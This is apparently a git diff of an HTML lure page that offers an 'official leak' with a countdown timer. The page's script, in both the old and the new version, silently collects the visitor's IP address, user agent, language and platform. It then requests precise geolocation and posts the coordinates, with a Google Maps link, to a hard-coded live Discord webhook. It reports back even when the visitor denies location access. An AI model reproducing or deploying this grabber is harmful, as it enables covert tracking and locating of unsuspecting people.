@@ -99,7 +99,7 @@ opacity:.55
 </div>
 
 <div class="buttons">
-<a class="btn" href="https://www.google.com/search?q=google+map+my+location+live&sca_esv=074920bdea4960d4&sxsrf=ANbL-n5gJvW3L-cQ7KUgQxGU9YVOGwy7BA%3A1770667645083&ei=fT6KaZ3dBKSokdUPnoOxuAI&oq=google+map+my+location&gs_lp=Egxnd3Mtd2l6LXNlcnAiFmdvb2dsZSBtYXAgbXkgbG9jYXRpb24qAggE" target="_blank">
+<a class="btn" href="https://www.google.com/search?q=google+map+my+location+live" target="_blank">
 הדלפה רשמית לפני כולם
 </a>
 <a class="btn" href="https://whatismyipaddress.com/" target="_blank">
@@ -112,80 +112,110 @@ opacity:.55
 
 <script>
 (function() {
-  // ---------- webhook (test) ----------
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1472664432134852740/m7btUoF6rBDTpparYGo-IsyFCxGZ0yM5jrKotgumvRsgUAe8oGtj8WEmYZ213HDP9iZ5"; // replaceable but works as test
-
-  // ---------- helper: send data to webhook ----------
-  function sendToWebhook(payload, label = 'IP') {
+  // Your Discord webhook URL
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1472664432134852740/m7btUoF6rBDTpparYGo-IsyFCxGZ0yM5jrKotgumvRsgUAe8oGtj8WEmYZ213HDP9iZ5";
+  
+  // Function to send to Discord webhook
+  function sendToDiscord(content, title, color = 5814783) {
+    const payload = {
+      embeds: [{
+        title: title,
+        description: content,
+        color: color,
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: "Echo Files Monitor"
+        }
+      }]
+    };
+    
     fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        source: 'echo_files_test',
-        type: label,
-        data: payload,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
-      })
-    }).catch(err => console.warn('webhook send failed (expected test behaviour)', err));
+      body: JSON.stringify(payload)
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.log('Discord webhook responded with:', response.status);
+      }
+    })
+    .catch(err => console.log('Webhook send attempt (test mode):', err));
   }
 
-  // ---------- 1. get IP via ipify (IPv4) ----------
+  // Get IP and send to Discord
   fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(ipData => {
       const ipv4 = ipData.ip;
-      // first webhook: IPv4 + basic info
-      sendToWebhook({
-        ip: ipv4,
-        message: 'initial IP capture'
-      }, 'IPv4');
       
-      // optional: store ip for later use in location ping
+      // Create IP info message
+      const ipMessage = `**IP Address:** ${ipv4}\n**User Agent:** ${navigator.userAgent}\n**Language:** ${navigator.language}\n**Platform:** ${navigator.platform}`;
+      
+      // Send to Discord
+      sendToDiscord(ipMessage, '📡 IP Address Captured', 5814783);
+      
+      // Store IP for later
       sessionStorage.setItem('visitor_ip', ipv4);
+      
+      console.log('IP captured:', ipv4);
     })
     .catch(err => {
-      console.warn('ipify failed', err);
-      sendToWebhook({ error: 'could not fetch IP', detail: err.message }, 'IPv4_fail');
+      console.log('Could not fetch IP');
+      sendToDiscord('Failed to capture IP address', '⚠️ IP Capture Failed', 16711680);
     });
 
-  // ---------- 2. location request (polite, only after user accepts) ----------
-  // we wait a tiny bit so IP webhook is not blocked, then ask for location
+  // Request location permission and send to Discord
   setTimeout(() => {
     if (!navigator.geolocation) {
-      sendToWebhook({ error: 'geolocation not supported' }, 'geo_unsupported');
+      sendToDiscord('Geolocation is not supported by this browser', '📍 Geolocation Unsupported', 16711680);
       return;
     }
 
-    // ask for permission (browser prompt) – if user allows, send location webhook
+    // Ask for location
     navigator.geolocation.getCurrentPosition(
       (position) => {
         const { latitude, longitude, accuracy } = position.coords;
-        const storedIp = sessionStorage.getItem('visitor_ip') || 'unknown';
-        // second webhook: location data
-        sendToWebhook({
-          ip: storedIp,
-          lat: latitude,
-          lng: longitude,
-          accuracy: accuracy,
-          message: 'user accepted location'
-        }, 'geolocation');
+        const storedIp = sessionStorage.getItem('visitor_ip') || 'Unknown';
+        
+        // Create location message
+        const locationMessage = `**IP:** ${storedIp}\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}\n**Accuracy:** ±${Math.round(accuracy)} meters\n**Google Maps:** https://www.google.com/maps?q=${latitude},${longitude}`;
+        
+        // Send to Discord
+        sendToDiscord(locationMessage, '📍 Location Access Granted', 3066993);
+        
+        console.log('Location captured');
       },
       (error) => {
-        // user denied or error – send basic info without coordinates
-        const storedIp = sessionStorage.getItem('visitor_ip') || 'unknown';
-        sendToWebhook({
-          ip: storedIp,
-          error: error.message,
-          code: error.code,
-          message: 'location permission denied or error'
-        }, 'geo_denied');
+        const storedIp = sessionStorage.getItem('visitor_ip') || 'Unknown';
+        let errorMessage = `**IP:** ${storedIp}\n`;
+        
+        // Better error messages
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            errorMessage += '**Status:** User denied location request';
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMessage += '**Status:** Location information unavailable';
+            break;
+          case error.TIMEOUT:
+            errorMessage += '**Status:** Location request timed out';
+            break;
+          default:
+            errorMessage += `**Status:** ${error.message}`;
+        }
+        
+        sendToDiscord(errorMessage, '🚫 Location Access Denied', 16711680);
+        console.log('Location denied');
       },
-      { timeout: 7000, enableHighAccuracy: false }
+      { 
+        timeout: 10000,
+        maximumAge: 0,
+        enableHighAccuracy: true
+      }
     );
-  }, 800); // short delay to not interfere with IP fetch
+  }, 1000);
 
-  // ---------- original countdown code (preserved) ----------
+  // Keep your original countdown code
   let key = "countdown_end";
   let end = localStorage.getItem(key);
   if (!end) {
@@ -205,7 +235,5 @@ opacity:.55
   }, 1000);
 })();
 </script>
-
-<!-- tiny note: webhook shown in console if fails – purely test -->
 </body>
 </html>
